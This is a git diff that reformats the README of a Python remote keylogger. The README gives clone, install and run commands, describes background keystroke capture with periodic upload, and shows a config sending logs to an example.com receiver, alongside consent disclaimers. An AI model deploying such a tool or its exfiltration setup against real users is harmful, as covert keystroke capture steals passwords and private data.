@@ -14,79 +14,81 @@ The Remote KeyLogger is a sophisticated Python-based tool for capturing and tran
 🛠️ Getting Started
 To get started with the Remote KeyLogger, follow the simple steps below. This tool is easy to set up and highly customizable for your needs.
 
-Use Cases:
-✔️ User Behavior Monitoring (with consent)
-✔️ Educational Purposes
-✔️ Security Auditing
-💻 Installation
+Use Cases: <br>
+✔️ User Behavior Monitoring (with consent) <br>
+✔️ Educational Purposes <br>
+✔️ Security Auditing <br>
+💻 Installation <br>
 Clone the Repository:
 
-bash
-Copy code
+
+<hr>
 git clone https://github.com/tejasbargujepatil/Keylogger.py
+<hr>
 cd Keylogger.py
 Install Required Dependencies:
 
-bash
-Copy code
+<hr>
 pip install -r requirements.txt
+<hr>
 Configure the Server:
 Update the server_url in the Python script (main.py) to point to your log receiver endpoint.
 
 Run the KeyLogger:
 
-bash
-Copy code
+
+<hr>
 python main.py
+<hr>
 🎯 Usage
-After installation, the KeyLogger will begin logging keystrokes immediately. It works in the background and periodically transmits logs based on your configured buffer size.
+After installation, the KeyLogger will begin logging keystrokes immediately.<br> It works in the background and periodically transmits logs based on your configured buffer size.
 
 Command-line Options:
 Log File: Customize the path where logs are stored locally.
 Buffer Size: Adjust the number of keystrokes before sending logs to the server.
 Example Command:
-bash
-Copy code
+
+
 python main.py --log_file "path/to/logfile.txt" --buffer_size 100
-Special Key Mapping:
-Space ->
-Enter -> \n
-Backspace -> [BACKSPACE]
-Arrow Keys -> [UP], [DOWN], [LEFT], [RIGHT]
+Special Key Mapping:<br> 
+Space -> <br> 
+Enter -> \n  <br> 
+Backspace -> [BACKSPACE]  <br> 
+Arrow Keys -> [UP], [DOWN], [LEFT], [RIGHT]  <br> 
 ⚙️ Configuration
 The KeyLogger allows you to easily adjust settings within the code, such as the buffer size, log file path, and remote server URL.
 
 Example Configuration:
 python
-Copy code
+<hr>
 server_url = "https://example.com/log_receiver"
 logger = RemoteKeyLogger(server_url=server_url, buffer_size=50)
 logger.run()
-🔐 Security Considerations
-Using this tool responsibly is crucial. Here are some best practices to ensure data privacy and security:
+<hr>
+🔐 Security Considerations <br> 
+**Using this tool responsibly is crucial. Here are some best practices to ensure data privacy and security:**
 
 Encryption: Transmit logs using HTTPS or add custom encryption for better protection.
 Server Authentication: Ensure that only authorized entities can access the remote server.
-Compliance: Always secure explicit consent from monitored users and ensure compliance with legal requirements.
+Compliance: Always secure explicit consent from monitored users and ensure compliance with legal requirements. <br> <br> 
 🛡️ License
 This project is licensed under the MIT License – see the LICENSE file for details.
 
-🤝 Contributing
+🤝 Contributing <br> <br> 
 We welcome contributions to enhance this project! If you have ideas, improvements, or bug fixes, feel free to:
 
 Fork the repository.
-Create a Branch:
-bash
-Copy code
+<hr>
 git checkout -b feature/YourFeature
-Commit Your Changes:
+Commit Your Changes: <br> 
 bash
-Copy code
+<hr>
 git commit -m 'Add new feature'
+<hr><br> 
 Push to the Branch:
-bash
-Copy code
+<br> <hr>
 git push origin feature/YourFeature
+<hr>
 Submit a Pull Request.
 📧 Contact
 If you have any questions or suggestions, feel free to reach out to the maintainer:
